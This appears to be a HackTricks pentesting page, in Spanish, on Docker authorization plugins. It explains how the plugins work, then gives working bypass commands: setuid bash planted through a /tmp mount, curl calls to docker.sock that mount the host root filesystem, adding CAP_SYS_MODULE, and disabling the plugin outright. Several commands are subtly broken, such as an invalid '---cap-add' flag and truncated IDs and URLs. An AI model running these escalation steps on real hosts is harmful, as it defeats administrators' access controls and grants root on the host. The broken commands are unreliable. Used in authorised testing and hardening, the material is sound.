{{#include ../../../banners/hacktricks-training.md}}

**El modelo de** autorización **de Docker** es **todo o nada**. Cualquier usuario con permiso para acceder al daemon de Docker puede **ejecutar cualquier** comando del cliente de Docker. Lo mismo es cierto para los llamadores que utilizan la API del Engine de Docker para contactar al daemon. Si necesitas **un mayor control de acceso**, puedes crear **plugins de autorización** y agregarlos a la configuración de tu daemon de Docker. Usando un plugin de autorización, un administrador de Docker puede **configurar políticas de acceso granulares** para gestionar el acceso al daemon de Docker.

# Arquitectura básica

Los plugins de autenticación de Docker son **plugins externos** que puedes usar para **permitir/denegar** **acciones** solicitadas al daemon de Docker **dependiendo** del **usuario** que lo solicitó y de la **acción** **solicitada**.

**[La siguiente información es de la documentación](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Cuando se realiza una **solicitud HTTP** al **daemon** de Docker a través de la CLI o mediante la API del Engine, el **subsystema de autenticación** **pasa** la solicitud a los **plugins de autenticación** instalados. La solicitud contiene el usuario (llamador) y el contexto del comando. El **plugin** es responsable de decidir si **permitir** o **denegar** la solicitud.

Los diagramas de secuencia a continuación representan un flujo de autorización de permitir y denegar:

![Flujo de autorización permitir](https://docs.docker.com/engine/extend/images/authz_allow.png)

![Flujo de autorización denegar](https://docs.docker.com/engine/extend/images/authz_deny.png)

Cada solicitud enviada al plugin **incluye el usuario autenticado, los encabezados HTTP y el cuerpo de la solicitud/respuesta**. Solo se pasan al plugin el **nombre de usuario** y el **método de autenticación** utilizado. Lo más importante, **no** se pasan **credenciales** o tokens de usuario. Finalmente, **no todos los cuerpos de solicitud/respuesta se envían** al plugin de autorización. Solo se envían aquellos cuerpos de solicitud/respuesta donde el `Content-Type` es `text/*` o `application/json`.

Para comandos que pueden potencialmente secuestrar la conexión HTTP (`HTTP Upgrade`), como `exec`, el plugin de autorización solo se llama para las solicitudes HTTP iniciales. Una vez que el plugin aprueba el comando, la autorización no se aplica al resto del flujo. Específicamente, los datos de transmisión no se pasan a los plugins de autorización. Para comandos que devuelven respuestas HTTP en fragmentos, como `logs` y `events`, solo se envía la solicitud HTTP a los plugins de autorización.

Durante el procesamiento de solicitudes/respuestas, algunos flujos de autorización pueden necesitar realizar consultas adicionales al daemon de Docker. Para completar tales flujos, los plugins pueden llamar a la API del daemon de manera similar a un usuario regular. Para habilitar estas consultas adicionales, el plugin debe proporcionar los medios para que un administrador configure políticas de autenticación y seguridad adecuadas.

## Varios Plugins

Eres responsable de **registrar** tu **plugin** como parte del **inicio** del daemon de Docker. Puedes instalar **múltiples plugins y encadenarlos**. Esta cadena puede ser ordenada. Cada solicitud al daemon pasa en orden a través de la cadena. Solo cuando **todos los plugins otorgan acceso** al recurso, se concede el acceso.

# Ejemplos de Plugins

## Twistlock AuthZ Broker

El plugin [**authz**](https://github.com/twistlock/authz) te permite crear un archivo **JSON** simple que el **plugin** estará **leyendo** para autorizar las solicitudes. Por lo tanto, te da la oportunidad de controlar muy fácilmente qué endpoints de API pueden alcanzar a cada usuario.

Este es un ejemplo que permitirá a Alice y Bob crear nuevos contenedores: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

En la página [route_parser.go](https://github.com/twistlock/authz/blob/master/core/route_parser.go) puedes encontrar la relación entre la URL solicitada y la acción. En la página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puedes encontrar la relación entre el nombre de la acción y la acción.

## Tutorial de Plugin Simple

Puedes encontrar un **plugin fácil de entender** con información detallada sobre instalación y depuración aquí: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lee el `README` y el código de `plugin.go` para entender cómo funciona.

# Bypass del Plugin de Autenticación de Docker

## Enumerar acceso

Las principales cosas a verificar son **qué endpoints están permitidos** y **qué valores de HostConfig están permitidos**.

Para realizar esta enumeración puedes **usar la herramienta** [**https://github.com/carlospolop/docker_auth_profiler**](https://github.com/carlospolop/docker_auth_profiler)**.**

## `run --privileged` no permitido

### Privilegios Mínimos
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Ejecutando un contenedor y luego obteniendo una sesión privilegiada

En este caso, el sysadmin **no permitió a los usuarios montar volúmenes y ejecutar contenedores con la `--privileged` flag** o dar alguna capacidad extra al contenedor:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Sin embargo, un usuario puede **crear un shell dentro del contenedor en ejecución y otorgarle los privilegios adicionales**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Ahora, el usuario puede escapar del contenedor utilizando cualquiera de las [**técnicas discutidas anteriormente**](#privileged-flag) y **escalar privilegios** dentro del host.

## Montar Carpeta Escribible

En este caso, el sysadmin **no permitió a los usuarios ejecutar contenedores con la bandera `--privileged`** o dar alguna capacidad extra al contenedor, y solo permitió montar la carpeta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
> [!NOTE]
> Tenga en cuenta que tal vez no pueda montar la carpeta `/tmp`, pero puede montar una **carpeta escribible diferente**. Puede encontrar directorios escribibles usando: `find / -writable -type d 2>/dev/null`
>
> **¡Tenga en cuenta que no todos los directorios en una máquina linux soportarán el bit suid!** Para verificar qué directorios soportan el bit suid, ejecute `mount | grep -v "nosuid"` Por ejemplo, generalmente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` y `/var/lib/lxcfs` no soportan el bit suid.
>
> También tenga en cuenta que si puede **montar `/etc`** o cualquier otra carpeta **que contenga archivos de configuración**, puede cambiarlos desde el contenedor de docker como root para **abusar de ellos en el host** y escalar privilegios (tal vez modificando `/etc/shadow`)

## Unchecked API Endpoint

La responsabilidad del sysadmin que configura este plugin sería controlar qué acciones y con qué privilegios cada usuario puede realizar. Por lo tanto, si el administrador adopta un enfoque de **lista negra** con los endpoints y los atributos, podría **olvidar algunos de ellos** que podrían permitir a un atacante **escalar privilegios.**

Puede consultar la API de docker en [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Unchecked JSON Structure

### Binds in root

Es posible que cuando el sysadmin configuró el firewall de docker, **olvidó algún parámetro importante** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Binds**".\
En el siguiente ejemplo, es posible abusar de esta mala configuración para crear y ejecutar un contenedor que monte la carpeta raíz (/) del host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
> [!WARNING]
> Nota cómo en este ejemplo estamos usando el **`Binds`** como una clave de nivel raíz en el JSON, pero en la API aparece bajo la clave **`HostConfig`**

### Binds en HostConfig

Sigue la misma instrucción que con **Binds en raíz** realizando esta **request** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montajes en root

Siga las mismas instrucciones que con **Vínculos en root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts en HostConfig

Siga las mismas instrucciones que con **Binds en root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributo JSON no verificado

Es posible que cuando el sysadmin configuró el firewall de docker **se olvidó de algún atributo importante de un parámetro** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Capabilities**" dentro de "**HostConfig**". En el siguiente ejemplo es posible abusar de esta mala configuración para crear y ejecutar un contenedor con la capacidad **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
> [!NOTE]
> El **`HostConfig`** es la clave que generalmente contiene los **privilegios** **interesantes** para escapar del contenedor. Sin embargo, como hemos discutido anteriormente, ten en cuenta que usar Binds fuera de él también funciona y puede permitirte eludir restricciones.

## Deshabilitando el Plugin

Si el **sysadmin** **olvidó** **prohibir** la capacidad de **deshabilitar** el **plugin**, ¡puedes aprovechar esto para deshabilitarlo completamente!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Recuerda **volver a habilitar el plugin después de escalar**, o un **reinicio del servicio de docker no funcionará**!

## Informes de Bypass del Plugin de Autenticación

- [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

{{#include ../../../banners/hacktricks-training.md}}
